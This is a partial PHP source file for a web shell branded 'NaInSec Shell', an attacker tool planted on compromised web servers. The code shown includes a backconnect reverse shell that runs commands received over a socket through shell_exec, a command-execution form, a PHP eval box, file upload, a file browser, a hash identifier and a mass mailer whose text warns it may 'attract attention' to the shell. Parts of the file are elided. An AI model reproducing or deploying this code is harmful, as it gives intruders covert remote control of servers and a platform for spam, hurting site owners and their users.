...
<style stype="text/css">
  ...
  .response {
    ...
    color: lime;
    height: 300px;
    border-bottom: solid 1px #030143;
    border-right: solid 1px #030143;
    border-left: solid 1px #030143;
    border-top: 0;
    outline: none;
    background: #0A0A0A;
    color: lime;
...
<body>
  <div id="main_content">
    ...
    echo "<title>.:: NaInSec Shell ::.</title>";

    function get_srv_info() {

      echo "<br /><span id='title'>National Indonesia Security</span><br /><div class='box'><b>Server Name : </b>".$_SERVER["SERVER_NAME"]."<br />
    ...
    if (strstr($CurrentUrl, "readfile")) {
      ...
      get_srv_info();
      echo "<p>NaInSec hash identifier is able to identify MD5, SHA-1, MySQL5, DES(Unix), SHA-256, SHA-384, SHA-512, MD5(Unix), MD5(APR), MD5(phpBB3), MD5(Wordpress), SHA-256(Unix), SHA-512(Unix) and MD5(Base-64).</p>";
      ...
      <center>
        <form action="" method="POST">
          <table>
            <tr class="optionstr"><td>Enter Hash :</td>	<td><input type="text" name="hash" class="command" /></td><td><input type="submit" name="gethash" value="Identify Hash" /></td></tr><tr class="optionstr"><td>Result : </td><td><?php echo $hashresult; ?></td></tr>
          </table>
        </form>
      </center>
...
<div id="back">
      ...
      if (isset($_POST['bind'])) {
        ...
        if ($errno != 0) {
          ...
          fputs ($sockfd, "\n{################################################################}\n..:: NaInSec Shell ::..\n\n=> Backconnect \n=> Back	\n
            ...
            $cmdPrompt = '[NIS]#:> '; fputs ($sockfd, $cmdPrompt); $command = fgets($sockfd, $len);
            fputs($sockfd, "\n" . shell_exec($command) . "\n\n");
          } fclose($sockfd);
        }}
      echo "</p></div>";
      ...
      if (isset($_POST['create'])) {
        $ourFileName = $newfilename; $ourFileHandle = fopen($ourFileName, 'w') or die("can't open file"); fclose($ourFileHandle);
      }
      echo "<br /><br />";
      ...
      if (isset($_POST['godir'])) {
        $mandircha = $_POST['chdir']; if ($mandircha) {
          header("Location: ?ZmlsZV9leHBsb3Jlcg=".$_POST['chdir']);
        }}
      ?>
    </div>
  </p>
  <table class="FileBrowserTable">
    <tr><td class="TableHeader_Name"> FileName's</td><td class="TableHeader">Filetype</a></td><td class="TableHeader">Size</td><td class="TableHeader">Permisions</td><td class="TableHeader">Last Modified</td><td class="TableHeaderoptions"> Options</td></tr>
  <?php
...
<div style="padding:10px;background-color: #292929;border: 1px solid #3467BA;border-radius: 6px;-moz-border-radius: 6px;-webkit-border-radius: 6px;width:220px;float:left;margin:10px 10px 15px 0px;">
  <h4>File Upload</h4><form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file" /><br /><input type="submit" name="upload" value="Upload File" />
  </form>
</div>
<?php
if (isset($_POST['upload'])) {
  if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES["file"]["tmp_name"], $file_explorer."/". $_FILES["file"]["name"]); echo '<script>alert("File successfully uploaded, enjoy.");</script>';
  }
}
?>
<div style="padding:10px;background-color: #292929;border: 1px solid #3467BA;border-radius: 6px;-moz-border-radius: 6px;-webkit-border-radius: 6px;width:220px;float:left;margin:10px 10px 15px 0px;">
  ...
  <form action="" method="post">
    <input type="text" name="dirname" /><br /><input type="submit" name="createdir" value="Create Dir" />
  </form>
</div>
<?php
if (isset($_POST['createdir'])) {
...
<p>
  Be warned using the mass mailing feature may attract attention to your NaInSec Shell. Seperate each email with <strong>;</strong>
</p>
<form action="" method="post">
  <table>
    <tr><td>To Email(s) : </td><td><input type="text" style="background-color:#010101;color:#f2f2f2;border:1px solid #3467BA;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px; width:220px;" name="email" placeholder="NaInSec@NaInSec.Pro.Net" /></tr><tr><td>Subject : </td>	<td><input type="text" style="background-color:#010101;color:#f2f2f2;border:1px solid #3467BA;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px;width:220px" name="subject" /></td></tr><tr><td>From Email : </td><td><input type="email" style="background-color:#010101;color:#f2f2f2;border:1px solid #3467BA;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px;width:220px;" name="fromEmail" placeholder="NaInSec@NaInSec.Pro.Net" /></td></tr><tr><td>Message : </td><td></td></tr>
    </table>
    <table>
      <tr><td><textarea style="background-color:#010101;color:#f2f2f2;border:1px solid #3467BA;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px; height:200px;width:290px;" name="message"></textarea></td></tr><tr><td><input type="submit" name="send" value="Send Message(s)" /></td></tr>
    </table>
  </form>
  <?php
  if (isset($_POST['send'])) {
    $email = $_POST['email']; $subject = $_POST['subject']; $from = $_POST['fromEmail']; $message = $_POST['message']; if ($email && $subject && $from && $message) {
      $emails = explode(";", $email); foreach ($emails as $email) {
  ...
  <form action="" method="post">
    <table>
      <tr><td><b>Command Execution : </b></td><td><input type="text" placeholder="root:~# " autocomplete="off" name="command" class="command" /></td></tr>
    </table>
    <?php
    $out = array();
    if (cmd() == "exec") {
    ...
    echo "
		<h4>Information</h4>
		<p>NaInSec Shell v".$shellVersion." Open Beta Edition - coded by XSVSCyb3r below are the known issues and bugs.</p>";
    ...
    <div style="float:left;width:700px;">
      ...
      <form action="" method="post">
        <textarea name="phpeval" style="width:700px;height:190px;padding:5px;background:#CCCCCC;">//Example, get all PHP info about the server echo phpinfo();</textarea><br />
    ...
    <div style="float:right;width:250px;">
      ...
      <p>
        <strong>Example : </strong><i>echo phpinfo();</i>
      </p>
      <br /><br />
      <h4>Warning</h4>
      <p>
    ...
    ?>
    <br /><br /><br /><br /><div class='Logo'>
      NaInSec v<?php echo $shellVersion; ?>
    </div>
    <div class='logotext'>
      NaInSec Shell Coded By XSVSCyb3r
    </div>
    <br /><br /><br />
    <?php
  }
